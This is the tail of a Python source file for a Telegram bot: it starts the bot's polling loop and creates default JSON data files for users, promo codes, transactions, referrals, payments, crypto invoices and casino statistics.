    logger.info("Бот запущен со ВСЕМИ функциями включая SMS!")
    await dp.start_polling(bot)

def initialize_files():
    files_to_create = {
        USERS_FILE: {},
        PROMOCODES_FILE: {
            "Winter": {"limit": 5, "attempts": 3, "activated_by": []},
            "Proton": {"limit": 2, "attempts": 1, "activated_by": []}
        },
        TRANSACTIONS_FILE: {},
        REFERRALS_FILE: {},
        PENDING_PAYMENTS_FILE: {},
        CRYPTO_INVOICES_FILE: {},
        CASINO_STATS_FILE: {}
    }
    
    for filename, default_content in files_to_create.items():
        if not os.path.exists(filename):
            save_data(filename, default_content)

if __name__ == "__main__":
    asyncio.run(main())